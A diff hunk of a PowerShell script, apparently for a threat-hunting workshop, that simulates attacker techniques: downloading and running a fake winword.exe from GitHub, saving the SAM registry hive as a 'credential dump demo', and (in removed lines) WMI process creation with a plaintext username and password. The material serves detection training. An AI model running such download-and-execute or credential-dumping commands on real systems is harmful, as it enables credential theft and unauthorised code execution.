@@ -88,10 +88,6 @@ Write-Host "download and run fake winword.exe that start cmd.exe and powershell.
 Invoke-WebRequest -Uri "https://github.com/girdav01/hunt-workshop/blob/main/v1/winword.exe?raw=true" -OutFile "c:\data\winword.exe"
 Start-Process -FilePath c:\data\winword.exe
 
-# wmi execute
-Write-Host "wmi execute demo"
-Start-Process -FilePath wmic.exe -ArgumentList " /USER:'DEVWKS1001\david' /password:'Apple1995!'  process call create 'cmd.exe /c calc.exe /force'" -RedirectStandardOutput c:\output.txt -RedirectStandardError c:\errors.log
-
 # credential dump
 Write-Host "credential dump demo"
 Start-Process -FilePath reg.exe -ArgumentList "save hklm\sam c:\temp\sam.save'" -RedirectStandardOutput c:\output.txt -RedirectStandardError c:\errors.log
